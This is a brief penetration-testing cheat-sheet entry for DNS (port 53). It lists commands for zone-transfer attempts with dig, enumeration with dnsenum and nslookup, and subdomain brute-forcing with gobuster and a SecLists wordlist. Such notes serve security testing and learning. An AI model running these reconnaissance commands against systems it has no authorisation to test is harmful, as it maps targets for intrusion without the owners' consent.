DNS — TCP/UDP 53
++++++++++++++++++++++++++++++++++++++++
dig axfr @<ip_address> <domain>           # zone transfer
dnsenum --dnsserver <ip_address> <domain>
nslookup -> server <ip_address> -> set q=any -> <domain>
gobuster dns -d <domain> -r <ip_address> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
